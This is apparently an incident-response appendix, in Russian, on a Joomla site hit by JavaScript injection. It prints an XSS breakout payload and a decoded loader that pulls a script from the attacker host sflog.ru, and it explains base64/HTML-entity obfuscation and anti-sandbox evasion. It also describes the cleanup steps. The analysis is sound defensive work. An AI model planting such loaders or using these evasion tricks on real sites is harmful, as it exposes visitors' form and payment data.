## Приложение А. JS-инъекция: как была устроена

### 1. `js.aacaw.com` — неудавшийся XSS

В HTML на всех страницах лежало:

```html
<li class="item-101 default current active &quot;&gt;&lt;script src=&quot;https://js.aacaw.com/fp/v1.min.js&quot;&gt;&lt;/script&gt;">
```

Задумка — `"><script src="https://js.aacaw.com/fp/v1.min.js"></script>`, то есть вырваться из
атрибута `class`. Joomla экранирует кавычки, поэтому payload оставался текстом и не выполнялся
(проверено в реальном Chrome: запроса к домену нет). Лежало в параметре
`helixultimatemenulayout.customclass` пункта меню «Главная» (`nq1gm_menu`, id=101) — очищено.

### 2. `sflog.ru` — рабочая инъекция

Сидела в `<head>` **всех страниц**, между счётчиками GTM и Top.Mail.Ru — замаскирована под
ещё один счётчик. Хранилась в БД: `nq1gm_template_styles` id=9 (Helix Ultimate), ключ JSON
**`before_head`** — то есть поле «Custom Code → перед `</head>`» настроек шаблона.

```html
<script src="data:text/javascript;charset=utf-8; base64, c2V0VGltZW91dChmdW5jdGlvbi&#x67;pe2xldCB2aHFxeT0i…" async></script>
```

Пять слоёв маскировки:

1. `data:` URI — нет внешнего адреса для блок-листов;
2. base64;
3. **HTML-сущность `&#x67;` (буква `g`) внутри base64** — из-за неё поиск `grep sflog` по странице
   и по дампу базы даёт ноль;
4. внутри — `\uXXXX`-эскейпы и склейка строк: `"scri"+"pt"`, `"https:/"+"/sflog"+".ru/js/"`;
5. `_zlxi.remove()` — узел удаляет себя после вставки, в DevTools его не видно.

Расшифрованный загрузчик:

```js
setTimeout(function(){
  let s = document.createElement("script"); s.async = 1;
  s.src = "https://sflog.ru/js/?id=b75b2b959c…&domain=" + document.domain + "&term=0&r=vhqqy.js";
  document.getElementsByTagName("html")[0].appendChild(s);
  s.remove();
}, 181);
```

**Цепочка:**

| Ступень | Что | Особенности |
|---|---|---|
| 1 | загрузчик в `<head>` | см. выше |
| 2 | `sflog.ru/js/?id=…` (40 КБ) | маяк проверки `?sf=3356bc6` → `sflog.ru/chk/`; тянет `cdnsec.ru/rules.js` |
| 3 | `datacdn.ru/js/?id=…&f=main.js` (36 КБ) | грузится **по scroll/mousemove** (на тач-устройствах сразу) |
| 3b | `datacdn.ru/js/gwinfo/ne.php` | только если страница открыта **во фрейме** |

Третья ступень — WebSocket-клиент (Iris) + localForage: **постоянный канал управления в браузере
посетителя** плюс своё хранилище. Что исполнится — решал их сервер в момент подключения.

**Признаки умысла:** самоотключение на песочницах (`dmas = ["jshell.net","appspot"]` → `src="data:,"`);
отложенный запуск по действию пользователя, чтобы не попадаться краулерам; глушение чужих скриптов
(`window.blocked=true`, кука `_dmp_cookie_deny=1` на год, подмена `setTimeout` для `dmp_delay_0`,
зануление `qoopler`, `findGetParameter`, `getUrlVars`, `ajax`, `makeid`).

**Домены:** `sflog.ru` и `datacdn.ru` — один IP `92.255.229.221`, whois «Private Person» через REG.RU;
`cdnsec.ru` за Cloudflare, создан 07.07.2025. В логах видно, как маяк `?sf=3356bc6` ходил по сайту
(16.08 и 18.08 — его подхватил YandexBot).

На момент обнаружения цепочка была оборвана **случайно**: у `sflog.ru` протух Let's Encrypt
18.08.2026, браузер резал запрос по `ERR_CERT_DATE_INVALID`. Перевыпустили бы — заработало снова.

## Как чинили

1. Полный `mysqldump` обеих баз в `~/backup-claude/` — до любых правок.
2. Загрузчик найден по base64-сигнатуре (по строке `sflog` он не ищется: в JSON слэши
   экранированы как `\/`, а в base64 сидит HTML-сущность).
3. JSON параметров правился локально, на сервер ушёл SQL с **hex-литералами**
   (`SET params=0x…`) — так не ломается никакое экранирование.
4. Проверки перед записью: удалён ровно один тег; все семь идентификаторов счётчиков
   (`GTM-NF9NSTN`, `88981551`, `90586368`, `3512752` и др.) на месте; в `params` те же 171 ключ,
   изменён только `before_head`.
5. Кэш Joomla очищен, результат проверен снаружи — и по HTML, и в реальном Chrome
   (ни одного запроса к `sflog.ru`/`datacdn.ru`/`cdnsec.ru`, DOM не меняется, WebSocket не открывается).
6. Файлы атакующего перенесены в карантин (не удалены), каталоги иконок проверены на обоих сайтах.

## Наши системы

`siricrm.ru` и `crmsiri.ru` проверены — чисто: ни `data:`-скриптов, ни этих доменов ни в отдаваемом
HTML, ни в репозитории. Компрометация локальна для хостинга fo-y.ru.

Точка соприкосновения одна: страница оплаты шлёт данные плательщика в CRM
(`/accounting/acquiring/pay/`). Пока на fo-y.ru работал чужой JS, он технически видел всё, что
посетитель вводил в форму оплаты (ФИО, телефон, сумма) — до отправки к нам.
